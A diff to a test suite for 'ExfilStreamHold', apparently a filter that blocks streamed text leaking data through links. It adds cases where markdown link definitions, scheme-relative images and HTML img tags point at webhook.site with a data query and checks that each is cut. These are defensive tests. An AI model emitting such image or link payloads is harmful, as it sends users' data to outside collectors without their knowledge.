@@ -106,6 +106,12 @@ describe('ExfilStreamHold', () => {
     expect(seen.some(t => t.includes('https://example.com/a%5Cb') || t.includes('https://example.com/a\\b)c'))).toBe(true)
   })
 
+  it('cuts a definition whose URL is on the next line, and a scheme-relative URL', () => {
+    expect(run(['[r]:\n', 'https://webhook.site/?d=1\n'])).toBeNull()
+    expect(run(['![x](//webhook.site/', '?d=1)'])).toBeNull()
+    expect(run(['[r]: //webhook.site/?d=1\n'])).toBeNull()
+  })
+
   it('does not close an <img at a > inside a quoted attribute', () => {
     expect(run(['<img alt=">" src="https://webhook.site/?d=1">'])).toBeNull()
     expect(run(["<img alt='>' ", "src='https://webhook.site/?d=1'>"])).toBeNull()
